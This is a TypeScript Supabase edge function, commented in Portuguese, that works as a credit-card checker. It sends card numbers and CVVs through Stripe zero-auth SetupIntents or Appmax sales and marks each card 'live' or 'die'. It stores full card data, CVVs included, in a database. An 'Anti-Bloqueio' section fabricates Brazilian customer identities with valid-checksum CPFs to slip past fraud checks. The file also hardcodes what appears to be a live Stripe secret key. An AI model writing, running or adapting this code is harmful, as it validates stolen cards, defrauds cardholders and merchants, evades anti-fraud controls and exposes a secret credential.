import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
import Stripe from 'https://esm.sh/stripe@11.1.0?target=deno';

const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TestCardRequest {
    sessionId: string;
    cardNumber: string;
    expMonth: string;
    expYear: string;
    cvv: string;
    gatewayUrl?: string;
    processingOrder: number;
    amount?: number;
    proxyUrl?: string;
    token?: string;
}

// ========================================
// CONFIGURAÇÃO STRIPE (Chaves fornecidas)
// ========================================
const STRIPE_SECRET_KEY = Deno.env.get('STRIPE_SECRET_KEY') || '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';

// ========================================
// GERAÇÃO DE DADOS (Anti-Bloqueio)
// ========================================

function generateCPF(): string {
    const randomDigit = () => Math.floor(Math.random() * 10);
    const cpf = Array.from({ length: 9 }, randomDigit);
    let sum = 0;
    for (let i = 0; i < 9; i++) sum += cpf[i] * (10 - i);
    let remainder = sum % 11;
    const digit1 = remainder < 2 ? 0 : 11 - remainder;
    cpf.push(digit1);
    sum = 0;
    for (let i = 0; i < 10; i++) sum += cpf[i] * (11 - i);
    remainder = sum % 11;
    const digit2 = remainder < 2 ? 0 : 11 - remainder;
    cpf.push(digit2);
    return cpf.join('');
}

const firstNames = ['João', 'Maria', 'José', 'Ana', 'Pedro', 'Juliana', 'Carlos', 'Fernanda', 'Paulo', 'Mariana', 'Lucas', 'Beatriz', 'Rafael', 'Camila', 'Felipe', 'Amanda'];
const lastNames = ['Silva', 'Santos', 'Oliveira', 'Souza', 'Lima', 'Costa', 'Ferreira', 'Rodrigues', 'Almeida', 'Nascimento', 'Pereira', 'Carvalho'];
const products = ['Ebook Marketing Digital', 'Curso Online', 'Mentoria VIP', 'Acesso Premium', 'Pacote de Templates', 'Consultoria Express'];

function generateCustomerData() {
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    const randomNum = Math.floor(Math.random() * 9000) + 1000;

    return {
        firstname: firstName,
        lastname: lastName,
        email: `${firstName.toLowerCase()}.${lastName.toLowerCase()}${randomNum}@gmail.com`,
        telephone: `119${Math.floor(10000000 + Math.random() * 90000000)}`,
        document_number: generateCPF(),
        address: {
            street: 'Rua das Flores',
            number: Math.floor(Math.random() * 999) + 1,
            district: 'Centro',
            city: 'São Paulo',
            state: 'SP',
            zipcode: '01001-000'
        }
    };
}

// ========================================
// APPMAX API CLIENT
// ========================================

async function appmaxRequest(endpoint: string, method: string, body: any, token: string) {
    const url = `${Deno.env.get('APPMAX_API_URL') || 'https://api.appmax.com.br/api/v3'}${endpoint}`;

    console.log(`📡 Appmax Request: ${method} ${endpoint}`);

    const response = await fetch(url, {
        method,
        headers: {
            'Content-Type': 'application/json',
            'access-token': token
        },
        body: JSON.stringify(body)
    });

    const data = await response.json();

    if (!response.ok) {
        console.error(`❌ Appmax Error [${endpoint}]:`, JSON.stringify(data));
        throw new Error(data.message || `Appmax API Error: ${response.status}`);
    }

    return data;
}

async function processAppmaxSale(cardData: TestCardRequest, token: string) {
    const customerData = generateCustomerData();
    const productName = products[Math.floor(Math.random() * products.length)];
    const amount = cardData.amount || 1.00;

    // 1. CRIAR CLIENTE
    console.log('👤 Creating Customer...');
    const customerPayload = {
        firstname: customerData.firstname,
        lastname: customerData.lastname,
        email: customerData.email,
        telephone: customerData.telephone,
        cpf: customerData.document_number,
        address_street: customerData.address.street,
        address_number: customerData.address.number,
        address_district: customerData.address.district,
        address_city: customerData.address.city,
        address_state: customerData.address.state,
        address_zipcode: customerData.address.zipcode,
    };

    const customerRes = await appmaxRequest('/customer', 'POST', customerPayload, token);
    const customerId = customerRes.data?.id;

    if (!customerId) throw new Error('Failed to create customer');
    console.log(`✅ Customer Created: ${customerId}`);

    // 2. CRIAR PEDIDO
    console.log('📦 Creating Order...');
    const orderPayload = {
        customer_id: customerId,
        products: [{
            name: productName,
            qty: 1,
            price: amount
        }],
        total: amount
    };

    const orderRes = await appmaxRequest('/order', 'POST', orderPayload, token);
    const orderId = orderRes.data?.id;

    if (!orderId) throw new Error('Failed to create order');
    console.log(`✅ Order Created: ${orderId}`);

    // 3. PROCESSAR PAGAMENTO
    console.log('💳 Processing Payment...');
    const paymentPayload = {
        order_id: orderId,
        payment: {
            CreditCard: {
                number: cardData.cardNumber,
                cvv: cardData.cvv,
                month: cardData.expMonth,
                year: cardData.expYear,
                installments: 1,
                name: `${customerData.firstname} ${customerData.lastname}`.toUpperCase()
            }
        }
    };

    const paymentRes = await appmaxRequest('/payment/credit-card', 'POST', paymentPayload, token);

    return {
        success: true,
        status: paymentRes.data?.status === 'approved' ? 'live' : 'die',
        message: paymentRes.message || 'Transaction processed',
        raw: paymentRes
    };
}

// ========================================
// STRIPE API CLIENT
// ========================================

async function processStripeSale(cardData: TestCardRequest, secretKey: string) {
    const stripe = new Stripe(secretKey, { httpClient: Stripe.createFetchHttpClient() });

    console.log('💳 Processing Stripe Payment (0 Auth / SetupIntent)...');

    try {
        let paymentMethodId;

        // Se recebermos um TOKEN (do frontend), criamos um PaymentMethod a partir dele
        if (cardData.token) {
            console.log('🔑 Using Frontend Token:', cardData.token);
            const pm = await stripe.paymentMethods.create({
                type: 'card',
                card: { token: cardData.token }
            });
            paymentMethodId = pm.id;
        } else {
            // Fallback: Tenta criar token no backend (Geralmente falha com chaves Live sem PCI)
            console.warn('⚠️ No token provided, attempting backend tokenization (May fail)');
            const token = await stripe.tokens.create({
                card: {
                    number: cardData.cardNumber,
                    exp_month: cardData.expMonth,
                    exp_year: cardData.expYear,
                    cvc: cardData.cvv,
                },
            });
            const pm = await stripe.paymentMethods.create({
                type: 'card',
                card: { token: token.id }
            });
            paymentMethodId = pm.id;
        }

        // 0 Auth: Criar SetupIntent e confirmar
        const setupIntent = await stripe.setupIntents.create({
            payment_method: paymentMethodId,
            confirm: true,
            usage: 'off_session', // Indica que queremos salvar para uso futuro (validação robusta)
            automatic_payment_methods: { enabled: true, allow_redirects: 'never' } // Evita redirects 3DS se possível
        });

        // Verifica status
        let status = 'die';
        if (setupIntent.status === 'succeeded') {
            status = 'live';
        } else if (setupIntent.status === 'requires_payment_method') {
            status = 'die'; // Cartão recusado
        } else if (setupIntent.status === 'requires_action') {
            status = 'live'; // 3DS necessário = Cartão válido (geralmente)
        }

        return {
            success: true,
            status: status,
            message: setupIntent.last_setup_error?.message || setupIntent.status,
            raw: setupIntent
        };

    } catch (error: any) {
        console.error('❌ Stripe Error:', error.message);

        // Mapeamento de erros Stripe
        let status = 'die';
        if (error.code === 'card_declined') {
            status = 'die';
        } else if (error.type === 'StripeCardError') {
            status = 'die';
        } else {
            status = 'unknown';
        }

        return {
            success: false,
            status: status,
            message: error.message,
            raw: error
        };
    }
}

// ========================================
// MAIN HANDLER
// ========================================

serve(async (req) => {
    if (req.method === 'OPTIONS') return new Response('ok', { headers: corsHeaders });

    try {
        const supabaseClient = createClient(
            Deno.env.get('SUPABASE_URL') ?? '',
            Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
        );

        const requestData: TestCardRequest = await req.json();
        const { sessionId, cardNumber, expMonth, expYear, cvv, processingOrder, amount } = requestData;

        if (!sessionId || !cardNumber || !expMonth || !expYear || !cvv) {
            return new Response(JSON.stringify({ error: 'Missing fields' }), { status: 400, headers: corsHeaders });
        }

        const startTime = Date.now();
        let result;
        let gatewayUsed = 'APPMAX';

        try {
            // DECISÃO DE GATEWAY
            if (STRIPE_SECRET_KEY && STRIPE_SECRET_KEY.startsWith('sk_')) {
                gatewayUsed = 'STRIPE';
                const saleResult = await processStripeSale(requestData, STRIPE_SECRET_KEY);

                result = {
                    status: saleResult.status,
                    message: saleResult.message,
                    amount: amount,
                    responseTimeMs: Date.now() - startTime
                };
            } else {
                // Fallback para Appmax
                const token = Deno.env.get('APPMAX_ACCESS_TOKEN');
                if (!token) throw new Error('Nenhum gateway configurado (Appmax ou Stripe)');

                const saleResult = await processAppmaxSale(requestData, token);

                // Mapeamento Appmax
                const statusMap: any = {
                    'approved': 'live',
                    'authorized': 'live',
                    'paid': 'live',
                    'refused': 'die',
                    'refunded': 'die',
                    'charged_back': 'die',
                    'pending': 'unknown'
                };
                const apiStatus = saleResult.raw.data?.status?.toLowerCase() || 'unknown';
                const finalStatus = statusMap[apiStatus] || 'die';

                result = {
                    status: finalStatus,
                    message: saleResult.message,
                    amount: amount,
                    responseTimeMs: Date.now() - startTime
                };
            }

        } catch (err: any) {
            console.error('❌ Payment Process Error:', err.message);
            result = {
                status: 'unknown',
                message: err.message,
                amount: amount,
                responseTimeMs: Date.now() - startTime
            };
        }

        // Salva resultado
        await supabaseClient.from('card_test_results').insert([{
            session_id: sessionId,
            card_number: cardNumber,
            exp_month: expMonth,
            exp_year: expYear,
            cvv: cvv,
            gateway_url: gatewayUsed,
            processing_order: processingOrder,
            status: result.status,
            message: result.message,
            amount: result.amount,
            response_time_ms: result.responseTimeMs
        }]);

        return new Response(
            JSON.stringify({ success: true, testResult: result }),
            { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        );

    } catch (error: any) {
        console.error('💥 Critical Error:', error);
        return new Response(
            JSON.stringify({ error: error.message }),
            { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
        );
    }
});
